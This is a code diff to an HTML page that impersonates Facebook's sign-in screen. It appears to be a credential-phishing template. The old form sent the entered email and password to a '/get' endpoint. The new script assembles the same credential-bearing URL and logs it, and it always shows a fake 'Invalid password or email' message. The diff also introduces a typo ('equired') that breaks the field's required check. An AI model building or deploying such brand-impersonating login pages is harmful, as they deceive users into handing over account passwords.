@@ -14,6 +14,15 @@
       color: #1d2129;
     }
 
+    .error-message {
+      margin-top: 15px;
+      color: #ff9a9a;
+      font-weight: 500;
+      min-height: 20px;
+      font-size: 14px;
+      text-align: center;
+    }
+
     .login-container {
       width: 350px;
       background-color: white;
@@ -81,16 +90,29 @@
         </path>
       </g>
     </svg>
-    <form action="/get" method="get">
+    <form id="loginForm">
       <h1>Sign in</h1>
       <h2>Use your Facebook Account</h2>
       <label for="email"><b>Email</b></label>
-      <input type="text" placeholder="Enter Email" name="email" required>
+      <input type="text" placeholder="Enter Email" id="email" name="email" equired>
       <label for="password"><b>Password</b></label>
-      <input type="password" placeholder="Enter Password" name="password" required>
+      <input type="password" placeholder="Enter Password" id="password" name="password" required>
       <button type="submit">Sign in</button>
     </form>
+    <div id="errorMessage" class="error-message"></div>
   </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const params = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
+      const endpoint = `/get?${params}`;
+      console.log("Request would be sent to endpoint:", endpoint);
+      document.getElementById("errorMessage").textContent = "Invalid password or email.";
+    });
+  </script>
 </body>
 
 </html>
